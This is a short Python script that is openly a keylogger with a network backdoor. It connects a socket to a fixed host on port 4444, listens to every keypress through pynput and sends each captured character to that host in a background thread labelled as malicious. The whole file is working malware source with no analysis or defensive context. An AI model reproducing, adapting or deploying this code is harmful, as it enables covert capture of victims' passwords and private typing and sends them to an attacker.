import threading
import socket
import subprocess
from pynput.keyboard import Listener, Key



server_ip = '192.168.1.12'
port = 4444
    
backdoor = socket.socket()
backdoor.connect((server_ip, port))


def on_press(key):

    if hasattr(key, 'char'):  # Write the character pressed if available
        backdoor.send(key.char.encode())
    elif key == Key.space:  # If space was pressed, write a space
        backdoor.send(' '.encode())
    elif key == Key.enter:  # If enter was pressed, write a new line
        backdoor.send('\n'.encode())
    elif key == Key.tab:  # If tab was pressed, write a tab
        backdoor.send('\t'.encode())


def main():
    

    while True:
    	with Listener(on_press=on_press) as listener:  # Setup the listener
    		listener.join()  # Join the thread to the main thread


mal_thread = threading.Thread(target=main)
mal_thread.start()

